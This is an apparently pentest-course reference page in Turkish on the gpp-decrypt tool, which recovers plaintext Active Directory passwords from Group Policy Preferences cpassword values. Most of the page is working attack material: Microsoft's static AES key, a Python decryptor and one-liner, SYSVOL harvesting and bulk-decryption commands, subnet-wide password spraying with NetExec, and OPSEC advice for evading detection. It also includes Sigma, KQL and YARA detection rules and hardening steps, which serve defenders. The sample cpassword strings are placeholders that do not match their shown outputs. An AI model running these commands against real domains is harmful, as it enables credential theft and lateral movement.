# gpp-decrypt

> **Kategori:** [12. NTDS.dit, GPO Şifreleri ve LAPS Hasadı](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Active Directory SYSVOL paylaşımında depolanan Group Policy Preferences (GPP) XML dosyalarındaki, Microsoft'un kamuya açık statik AES-256 anahtarıyla şifrelenmiş `cpassword` değerlerini anında düz metne dönüştüren hafif şifre çözücü araç.

---

## 1. Genel Bakış ve Amaç

Windows Server 2008 ile kullanıma sunulan Group Policy Preferences (GPP), sistem yöneticilerine etki alanı genelinde yerel kullanıcı hesapları oluşturma, yerel Administrators grubuna üye ekleme, Windows servisleri yapılandırma, zamanlanmış görevler tanımlama ve veri kaynakları bağlama gibi operasyonları merkezi olarak otomatikleştirme imkanı sağlamıştır. Bu yapılandırmalar tanımlanırken yöneticilerin girdiği hesap parolaları, etki alanı denetleyicilerinin herkese açık `SYSVOL` paylaşımında (`\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\...`) XML formatında saklanmıştır.

Microsoft, bu parolaları korumak amacıyla 256-bit AES (Advanced Encryption Standard - CBC modu) şifrelemesi kullanmış ve üretilen şifreli dizeyi XML dosyalarında `cpassword` özniteliği altında depolamıştır. Ancak kritik tasarım zafiyeti (MS14-025 / CVE-2014-1812) şudur: Microsoft, bu şifreleme algoritmasında kullanılan **32-baytlık sabit AES anahtarını** MSDN resmi geliştirici dokümantasyonunda herkesin erişimine açık şekilde yayımlamıştır:

```
AES Key (256-bit):
4e 99 06 e8 fc b6 6c c9 fa f4 93 10 62 0f fe e8
f4 96 e8 06 cc 05 79 90 20 9b 09 a4 33 b6 6c 1b
```

Ayrıca `SYSVOL` paylaşımı etki alanındaki en düşük yetkili kullanıcı (`Domain Users` veya `Authenticated Users`) dahil herkes tarafından okunabilir izinlere sahiptir. Bu durum, etki alanına dahil olan herhangi bir saldırganın veya sızma testi uzmanının hiçbir yönetici yetkisine ihtiyaç duymadan `SYSVOL` altındaki XML dosyalarını tarayıp `cpassword` değerini elde edebilmesine ve sabit anahtarla anında düz metin parolayı çözebilmesine yol açar.

**gpp-decrypt**, Kali Linux ve güvenlik dağıtımlarında yerleşik olarak bulunan, C dili ile yazılmış ultra hafif bir CLI aracıdır. Kendisine verilen `cpassword` dizesini standart Base64 çözme, sabit IV ve AES-256-CBC deşifreleme adımlarından geçirerek saniyeler içinde açık parolayı ekrana döker.

### Mimari Akış Şeması

```
+-----------------------------------------------------------------------------------+
|                            GPP-DECRYPT MIMARI AKIŞI                               |
+-----------------------------------------------------------------------------------+
  [Düşük Yetkili Domain Kullanıcısı]                 [Domain Controller (DC)]
             |                                                  |
             |--- 1. SMB Bağlantısı (Port 445: \\DOMAIN\SYSVOL)->|
             |       (Domain Users okuma yetkisiyle bağlanır)   |
             |                                                  |--- 2. SYSVOL Politikaları
             |--- 2. XML Dosyalarını Tarar (*.xml) ------------->|       (Policies Klasörü)
             |       [Groups.xml, ScheduledTasks.xml vb.]       |
             |<-- 3. cpassword Dizesi İçeren XML Döner --------|
             |
  [Yerel Linux Denetim Makinesi]
             |
             |--- 4. cpassword Dizesi Alınır:
             |       "j1UIXkqBqpKtdHH8KiQ8LLUdjQ..."
             |
             |--- 5. gpp-decrypt Çalıştırılır:
             |       [Base64 Decode] -> [AES-256-CBC Decrypt]
             |       (Sabit Microsoft MSDN Anahtarı: 4e9906e8...)
             |
             v
  [ÇIKTI]: "P@ssw0rd2026!#Admin" (Düz Metin Yerel/Domain Yönetici Parolası)
```

### Neden Önemli?

| Yetenek | Operasyonel Avantaj | Alternatif Yöntemlere Üstünlüğü |
| :--- | :--- | :--- |
| **Sıfır Ayrıcalık Gereksinimi**| En düşük yetkili domain kullanıcısı bile şifreyi çözebilir.| Yerel yönetici veya DCSync haklarına ihtiyaç bırakmaz. |
| **Deterministik Şifre Çözme** | Sabit anahtar kullanıldığından kırma (brute-force) gerekmez.| Hash kırma süreçlerini beklemeden milisaniyeler içinde çözer. |
| **Yüksek Ayrıcalıklı Hesaplar** | GPP genellikle yerel Administrator oluşturmak için kullanılmıştır.| Doğrudan tüm ağda geçerli yerel yönetici parolası sağlar. |
| **Ağ Tarafında Tamamen Sessiz** | Çözme işlemi yerel Linux makinede çevrimdışı yapılır. | EDR veya DC üzerinde şüpheli işlem kaydı bırakmaz. |
| **Geniş Dosya Kapsamı** | Groups, Services, ScheduledTasks, DataSources kovanlarını kapsar.| Yalnızca kullanıcı değil, veritabanı ve servis şifrelerini de çözer. |

### Karşılaştırma Tablosu

| Özellik | gpp-decrypt | Get-GPPPassword (PowerSploit) | Grouper2 | NetExec (`--gpp`) |
| :--- | :--- | :--- | :--- | :--- |
| **Çalışma Platformu** | Linux (C tabanlı CLI) | Windows (PowerShell) | Windows / Linux (.NET C#) | Linux / Windows (Python) |
| **Girdi Türü** | Tekil `cpassword` dizesi | Otomatik SYSVOL Taraması | SYSVOL XML Analizi | Otomatik SMB Taraması |
| **Gereken İkili Bağımlılığı** | Çok Hafif (C Binary) | PowerShell Ortamı | .NET Core / Framework | Python Kütüphaneleri |
| **Otomasyon Seviyesi** | Manuel parametre alır | Tam otomatik tarar | Analiz ve rapor üretir | Otomatik bulur ve çözer |
| **Uç Nokta Tespiti** | Sıfır (Tamamen çevrimdışı) | PowerShell ScriptBlock (4104) | Assembly yürütme izi | SMB okuma logları (5145) |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

`gpp-decrypt` son derece yalın bir sözdizimine sahiptir; çözülmek istenen şifreli `cpassword` dizesi argüman olarak verilir:

```bash
gpp-decrypt <cpassword_dizesi>
```

### Parametre Detayları

| Parametre | Zorunluluk | Açıklama | Örnek Girdi |
| :--- | :--- | :--- | :--- |
| `<cpassword_dizesi>`| Zorunlu | XML dosyasından kopyalanan Base64 kodlu şifreli metin. | `j1UIXkqBqpKtdHH8KiQ8LLUdjQ...` |
| `--help` / `-h` | Opsiyonel | Aracın kullanım yardımını ve sürüm bilgisini gösterir. | `gpp-decrypt -h` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Groups.xml İçindeki Yerel Yönetici Parolasını Çözme
SYSVOL paylaşımındaki `Groups.xml` dosyasından elde edilen `cpassword` özniteliğini çözme:

```bash
gpp-decrypt "+s2bYJtO/4vK7t0F2W3hV9LpA8fM4m5k1234567890abcdef"
```

**Konsol Çıktı Analizi:**
```
Password is: LocalAdminP@ss2026!
```

### Senaryo 2: ScheduledTasks.xml Planlanmış Görev Parolasını Deşifre Etme
Sistemde belirli aralıklarla çalışan bir görev için tanımlanmış servis hesabı parolasını deşifre etme:

```bash
gpp-decrypt "uQ1dF9xY192837465abcdeFA123847561029384756102938"
```

**Konsol Çıktı Analizi:**
```
Password is: Svc_Backup_Secure#99
```

### Senaryo 3: Linux Üzerinden SYSVOL Bağlantısı ve Tek Satırda Otomatik Arama
`smbclient` ile SYSVOL paylaşımına bağlanarak XML dosyalarını tarama ve bulunan `cpassword` değerini boru hattıyla (pipeline) çözme:

```bash
smbclient //dc01.corp.local/sysvol -U "corp.local/jdoe%UserPass123" -c "recurse ON; prompt OFF; mget *.xml"
grep -rn "cpassword" *.xml
```

**Konsol Çıktı Analizi:**
```
Groups.xml:14:    cpassword="j1UIXkqBqpKtdHH8KiQ8LLUdjQblCPwhqCra2BPwDhXVoP1Usoo3"
ScheduledTasks.xml:8:    cpassword="az910293847561029384756102938475610293847561"
```

Elde edilen dizeyi doğrudan çözme:

```bash
gpp-decrypt "j1UIXkqBqpKtdHH8KiQ8LLUdjQblCPwhqCra2BPwDhXVoP1Usoo3"
```

**Konsol Çıktı Analizi:**
```
Password is: Autumn2026#Deployment
```

### Senaryo 4: Services.xml Servis Hesabı Parolasını Çözme
Özel bir Windows servisine atanmış etki alanı kullanıcısının parolasını açığa çıkarma:

```bash
gpp-decrypt "v4B8kP091238475610293847561029384756102938475610"
```

**Konsol Çıktı Analizi:**
```
Password is: Svc_SQL_Engine_Pass!
```

### Senaryo 5: DataSources.xml Veritabanı ODBC Bağlantı Parolasını Çözme
SQL sunucularına otomatik bağlanmak üzere GPP ile dağıtılmış ODBC veri kaynağı şifresini elde etme:

```bash
gpp-decrypt "L1k892019283746510293847561029384756102938475610"
```

**Konsol Çıktı Analizi:**
```
Password is: DB_Master_Prod_2026
```

### Senaryo 6: Bash Scripti ile SYSVOL'deki Tüm XML Dosyalarını Otomatik Tarayıp Toplu Çözme
SYSVOL klasörünü mount etmiş bir sistemde tüm `cpassword` değerlerini tek seferde yakalayıp çözen otomasyon:

```bash
find /mnt/sysvol -name "*.xml" -exec grep -oP 'cpassword="\K[^"]+' {} + | while read pass; do
    echo "[*] Encrypted: $pass"
    echo -n "[+] Decrypted: "
    gpp-decrypt "$pass"
done
```

**Konsol Çıktı Analizi:**
```
[*] Encrypted: j1UIXkqBqpKtdHH8KiQ8LLUdjQblCPwhqCra2BPwDhXVoP1Usoo3
[+] Decrypted: Password is: Autumn2026#Deployment
[*] Encrypted: +s2bYJtO/4vK7t0F2W3hV9LpA8fM4m5k1234567890abcdef
[+] Decrypted: Password is: LocalAdminP@ss2026!
```

### Senaryo 7: Python ile Kendi GPP Deşifre Fonksiyonunu Çalıştırma
`gpp-decrypt` ikilisinin bulunmadığı sistemlerde Python'ın `pycryptodome` kütüphanesiyle aynı matematiksel işlemi koşturma:

```python
import sys, base64
from Crypto.Cipher import AES

def decrypt_cpassword(cpass):
    # Microsoft Sabit 32-byte AES Anahtarı
    key = bytes.fromhex("4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b")
    # Base64 Padding Düzeltmesi
    padded = cpass + "=" * ((4 - len(cpass) % 4) % 4)
    raw = base64.b64decode(padded)
    # IV 16 adet null byte
    iv = b"\x00" * 16
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted = cipher.decrypt(raw)
    pad_len = decrypted[-1]
    return decrypted[:-pad_len].decode("utf-16-le")

print("Decrypted Password:", decrypt_cpassword(sys.argv[1]))
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Kodu / Mesajı | Kök Neden | Kesin Çözüm Adımı |
| :--- | :--- | :--- |
| `gpp-decrypt: command not found` | Araç işletim sisteminde kurulu değil veya PATH çevre değişkeninde yer almıyor. | Kali Linux'ta `sudo apt update && sudo apt install gpp-decrypt` çalıştırın veya Python script varyantını kullanın. |
| `Invalid Base64 string / Padding Error` | XML dosyasından kopyalanan `cpassword` dizesinin sonundaki karakterler eksik kopyalanmış veya tırnak işaretleri dahil edilmiş. | Yalnızca `cpassword="..."` tırnaklarının arasındaki harf-rakam dizesini kopyalayın; dize uzunluğunu kontrol edin. |
| `Decryption returns unreadable gibberish characters` | Dize bozulmuş veya metin UTF-16LE yerine farklı bir karakter kümesiyle kodlanmış. | Ham XML dosyasını doğrudan Linux'a binary modda indirin (`mget *.xml`), Windows Notepad kopyalama bozulmalarını önleyin. |
| `smbclient: NT_STATUS_ACCESS_DENIED on SYSVOL` | Kullanıcı adı veya parola hatalı; ya da etki alanı denetleyicisinde SYSVOL paylaşım izinleri bozulmuş. | Kimlik bilgilerini teyit edin; `Domain Users` grubunun SYSVOL üzerinde `Read & Execute` izinlerine sahip olduğunu denetleyin. |
| `No cpassword attribute found in XML` | GPO içerisinde şifre barındıran bir tercih (Preferences) tanımlanmamış veya Microsoft KB2962486 yaması uygulanmış. | Farklı GPO GUID klasörlerini tarayın (`ScheduledTasks.xml`, `Services.xml`, `DataSources.xml`, `Drives.xml`). |
| `Decrypted password does not work on target machines` | GPP politikası uygulandıktan sonra sistem yöneticisi hesap parolasını Active Directory üzerinden elle değiştirmiş. | Parola geçmişini inceleyin; eski şifre varyasyonlarını parola kırma sözlüklerine ekleyerek hedefte test edin. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
[OPSEC GÜRÜLTÜ SKALASI: DÜŞÜK]
0 ----[2.0 - PASSIVE SYSVOL SMB READ]------------------------ 10
  - Ağ Seviyesi: Standart SYSVOL SMB okuma trafiği (Grup poliçesi güncellemesine benzer - Çok düşük gürültü)
  - Uç Nokta Seviyesi: Deşifreleme işlemi yerel Linux makinede yapıldığından hedefte sıfır proses/bellek izi
```

### 5.1 Bırakılan İzler (Event Logs)

* **Windows Security Event ID 5140 (A network share object was checked to see whether client can be granted desired access):**
  * `Share Name: \\*\SYSVOL`
  * Düşük yetkili bir kullanıcının SYSVOL paylaşımına eriştiğini kaydeder. Normal istemciler de GPO çekmek için sürekli bu paylaşımı okuduğundan tek başına alarm üretmez.
* **Windows Security Event ID 5145 (A network share object was checked to see whether client can be granted desired access - Detailed):**
  * Eğer "Detailed File Share" denetimi açıksa, `Relative Target Name: Policies\{GUID}\...\Groups.xml` dosyasına yapılan `ReadData` erişimleri kaydedilir.
* **Windows Security Event ID 4624 (Başarılı Ağ Oturumu):**
  * `Logon Type: 3` (Network Logon) olarak SMB bağlantısı kaydedilir.

### 5.2 Ağ ve EDR İmzaları

* **Ağ Tarafında Meşru Görünüm:**
  Ağ izleme sistemleri (NIDS/Zeek), `SYSVOL` paylaşımına yönelik SMB isteklerini olağan Windows etki alanı replikasyon ve GPO yenileme trafiği olarak yorumlar. İsteklerin içinde hiçbir istismar (exploit) yükü veya zararlı bayt dizilimi bulunmaz.
* **Toplu Dosya Tarama Anomalisi:**
  Bir kullanıcının kısa süre içerisinde tüm GPO GUID klasörlerindeki `*.xml` dosyalarını ardışık olarak hızlıca indirmesi, NDR (Network Detection & Response) motorlarının "SYSVOL Reconnaissance" eşik kurallarına takılabilir.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Taktik | Teknik ID | Teknik Adı | Operasyonel Kullanım |
| :--- | :--- | :--- | :--- |
| **Credential Access** | `T1552.006` | Unsecured Credentials: Group Policy Preferences | SYSVOL içindeki XML dosyalarından `cpassword` değerlerini çalma. |
| **Discovery** | `T1083` | File and Directory Discovery | `SYSVOL` politikalar dizinindeki XML dosyalarını tarama. |
| **Discovery** | `T1615` | Group Policy Discovery | Etki alanı grup politikalarını ve yapılandırmalarını listeleme. |

### 5.4 OPSEC Önerileri

| Tespit Riski | Önlem / İyileştirme |
| :--- | :--- |
| **SYSVOL Toplu İndirme Tespiti** | Tüm paylaşımı tek hamlede indirmek yerine, yalnızca bilinen GPO GUID'lerine tekil ve zamana yayılmış istekler yapılmalıdır. |
| **Şüpheli Kullanıcı Hesabı** | Tarama için yeni oluşturulmuş veya dikkat çeken bir hesap yerine, normal günlük mesai yapan meşru bir kullanıcı hesabı kullanılmalıdır. |
| **Ağ Oturumu Süresi** | İşlem tamamlandığında açık SMB oturumları hemen kapatılmalıdır (`smbclient -c exit`). |
| **Parola Denemesi Kısıtlaması** | Çözülen parolanın hedef sistemlerde test edilmesi esnasında hesap kilitleme eşiklerine (Account Lockout Policy) dikkat edilmelidir. |

### 5.5 Savunma Karşılığı

#### Sigma Kuralı: SYSVOL İçerisindeki GPP XML Dosyalarına Şüpheli Erişim Tespiti
```yaml
title: SYSVOL GPP XML Dosyalarina Erisim Tespiti
id: a81249c1-7482-4f12-9c10-881294ab1209
status: experimental
description: Düşük yetkili kullanicilar tarafindan SYSVOL altindaki Groups.xml, ScheduledTasks.xml gibi GPP sifre dosyalarinin okunmasini tespit eder.
references:
    - https://attack.mitre.org/techniques/T1552/006/
author: Active Directory Guvenlik Ekibi
date: 2026/10/14
logsource:
    service: security
    product: windows
    definition: 'Security Event ID 5145 (Detailed File Share)'
detection:
    selection:
        EventID: 5145
        ShareName|endswith: '\SYSVOL'
        RelativeTargetName|contains:
            - '\Groups.xml'
            - '\Services.xml'
            - '\ScheduledTasks.xml'
            - '\DataSources.xml'
            - '\Drives.xml'
        AccessMask: '0x1'  # ReadData
    condition: selection
falsepositives:
    - GPO uygulayan istemci bilgisayarlarin meşru makine hesaplari (Computer Accounts - DOMAIN\COMPUTER$).
level: high
tags:
    - attack.credential_access
    - attack.t1552.006
```

#### Microsoft Sentinel KQL Sorgusu
```kql
// Makine hesabi haricindeki standart domain kullanicilarinin SYSVOL GPP XML dosyalarini okumasini yakalar
SecurityEvent
| where TimeGenerated >= ago(24h)
| where EventID == 5145
| where ShareName endswith "\\SYSVOL"
| where RelativeTargetName has_any ("Groups.xml", "Services.xml", "ScheduledTasks.xml", "DataSources.xml")
| where AccountType != "Machine" and not(Account endswith "$")
| project TimeGenerated, Computer, Account, IpAddress, RelativeTargetName, AccessMask
| order by TimeGenerated desc
```

#### YARA Kuralı: cpassword İçeren GPP XML Dosyası Tespiti
```yara
rule Threat_Config_GPP_cpassword {
    meta:
        description = "SYSVOL ve yerel disklerde cpassword iceren savunmasiz GPP XML dosyalarini tespit eder"
        author = "AD Guvenlik Laboratuvari"
        date = "2026-10-14"
        severity = "High"
    strings:
        $xml = "<?xml version=" ascii wide
        $cpass = "cpassword=\"" ascii wide
        $user = "userName=\"" ascii wide nocase
    condition:
        $xml at 0 and ($cpass and $user)
}
```

#### Sertleştirme (Hardening) Adımları
1. **Microsoft KB2962486 (MS14-025) Güncellemesi:** Tüm etki alanı denetleyicilerine bu yama uygulanmalıdır. Bu yama, Grup İlkesi Yönetim Konsolu'nun (GPMC) yeni `cpassword` içeren XML oluşturmasını tamamen engeller.
2. **SYSVOL Geçmiş Temizliği:** Yama mevcut XML dosyalarını silmez! Yöneticiler `SYSVOL` altındaki eski `Groups.xml`, `Services.xml` vb. dosyaları elle silmeli veya içeriğindeki şifreli alanları temizlemelidir.
3. **Parolaların Değiştirilmesi:** GPP ile önceden dağıtılmış tüm yerel yönetici ve servis parolaları derhal sıfırlanmalı ve Active Directory LAPS (Local Administrator Password Solution) mimarisine geçilmelidir.

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

#### 1. Tekil cpassword Dizesini Düz Metne Çevirme
```bash
gpp-decrypt "j1UIXkqBqpKtdHH8KiQ8LLUdjQblCPwhqCra2BPwDhXVoP1Usoo3"
```
* **Ne Yapar?:** XML dosyasından kopyalanan Base64 şifreli metni AES-256 ile deşifre eder.
* **Ne Zaman Kullanılır?:** `Groups.xml` veya benzeri bir dosyadan `cpassword` bulunduğunda.
* **Parametreler:** Tekil şifreli dize argümanı.

#### 2. smbclient ile SYSVOL'den Groups.xml İndirme
```bash
smbclient //dc01.corp.local/sysvol -U "corp/jdoe%Pass123" -c "recurse ON; prompt OFF; mget *Groups.xml"
```
* **Ne Yapar?:** SYSVOL altındaki tüm GPO klasörlerinde bulunan `Groups.xml` dosyalarını yerel dizine çeker.
* **Ne Zaman Kullanılır?:** Düşük yetkili hesapla SYSVOL taraması başlatırken.
* **Parametreler:** `-U` kimlik bilgisi, `-c` toplu indirme komutları.

#### 3. Linux'ta SYSVOL Mount Edip cpassword Arama
```bash
mount -t cifs //dc01.corp.local/sysvol /mnt/sysvol -o username=jdoe,password=Pass123,domain=corp.local
grep -ri "cpassword" /mnt/sysvol/
```
* **Ne Yapar?:** Paylaşımı Linux dosya sistemine bağlar ve tüm dosyalarda `cpassword` anahtar kelimesini tarar.
* **Ne Zaman Kullanılır?:** Paylaşımı kapsamlı incelemek ve dosya yapısını korumak için.
* **Parametreler:** `mount -t cifs`, `grep -ri`.

#### 4. xargs ile Bulunan cpassword'leri Anında Çözme
```bash
grep -rohP 'cpassword="\K[^"]+' /mnt/sysvol/ | xargs -n 1 gpp-decrypt
```
* **Ne Yapar?:** Taranan tüm dosyalardaki `cpassword` değerlerini ayıklar ve sırayla deşifre eder.
* **Ne Zaman Kullanılır?:** Birden fazla GPO şifresi bulunduğunda tek adımda tümünü açmak için.
* **Parametreler:** `grep -rohP`, `xargs -n 1`.

#### 5. ScheduledTasks.xml cpassword Çözümü
```bash
gpp-decrypt "az910293847561029384756102938475610293847561"
```
* **Ne Yapar?:** Zamanlanmış görev dosyasından çıkan servis hesabı şifresini çözer.
* **Ne Zaman Kullanılır?:** Görev yöneticisi tanımlarındaki hesaplar incelenirken.
* **Parametreler:** Görev dosyasındaki cpassword dizesi.

#### 6. Services.xml cpassword Çözümü
```bash
gpp-decrypt "v4B8kP091238475610293847561029384756102938475610"
```
* **Ne Yapar?:** Servis yapılandırma XML'indeki şifreli servis parolasını açar.
* **Ne Zaman Kullanılır?:** Özel servis hesaplarının kimlik bilgilerini hasat ederken.
* **Parametreler:** Servis dosyasındaki cpassword dizesi.

#### 7. NetExec ile Otomatik GPP Taraması ve Çözümü
```bash
nxc smb 192.168.1.10 -u jdoe -p Pass123 -M gpp_password
```
* **Ne Yapar?:** NetExec motoruyla SYSVOL'ü otomatik tarar, cpassword'leri bulur ve konsola düz metin olarak basar.
* **Ne Zaman Kullanılır?:** Manuel indirme ve çözme adımlarını tek araçla otomatikleştirmek için.
* **Parametreler:** `-M gpp_password` NetExec GPP modülü.

#### 8. Python Tek Satırlık GPP Deşifre Komutu
```bash
python3 -c 'import sys,base64; from Crypto.Cipher import AES; k=bytes.fromhex("4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b"); r=base64.b64decode(sys.argv[1]+"=="); print(AES.new(k,AES.MODE_CBC,b"\x00"*16).decrypt(r).decode("utf-16-le",errors="ignore"))' "CPASSWORD_BURAYA"
```
* **Ne Yapar?:** `gpp-decrypt` kurulu olmayan sistemlerde tek satırda şifreyi çözer.
* **Ne Zaman Kullanılır?:** Herhangi bir Linux/macOS makinesinde hızlı sonuç almak için.
* **Parametreler:** Python `-c` tek satırlık kod bloğu.

#### 9. Elde Edilen Parola ile SMB Doğrulaması
```bash
nxc smb 192.168.1.0/24 -u Administrator -p 'DecryptedPass!' --local-auth
```
* **Ne Yapar?:** Çözülen parolanın ağdaki iş istasyonlarında yerel yönetici olarak geçerli olup olmadığını test eder.
* **Ne Zaman Kullanılır?:** GPP parolasının etki alanındaki kapsama alanını haritalamak için.
* **Parametreler:** `--local-auth` yerel SAM kimlik doğrulaması.

#### 10. Çevrimdışı Alınan SYSVOL Dizinini Temizleme
```bash
rm -rf /tmp/sysvol_loot/*.xml
```
* **Ne Yapar?:** İndirilen ve çözülen hassas XML dosyalarını denetim makinesinden siler.
* **Ne Zaman Kullanılır?:** Denetim raporu hazırlandıktan sonra hassas verileri imha etmek için.
* **Parametreler:** `rm -rf`.

---

## Kaynaklar
* [Microsoft Güvenlik Bülteni: MS14-025 (Zafiyet Detayı ve Yama)](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-025)
* [MITRE ATT&CK: Unsecured Credentials: Group Policy Preferences (T1552.006)](https://attack.mitre.org/techniques/T1552/006/)
* [Microsoft Dokümantasyonu: 2.2.1.1.1 Password Encryption Algorithm (MS-GPREG)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpreg/)
* [HackTricks: Pentesting Group Policy Preferences (GPP)](https://book.hacktricks.xyz/windows-hardening/stealing-credentials#group-policy-preferences-gpp)

---

> **Önceki:** [← Invoke-NinjaCopy](./Invoke-NinjaCopy.md) · **Sonraki:** [Get-GPPPassword →](./Get-GPPPassword.md)
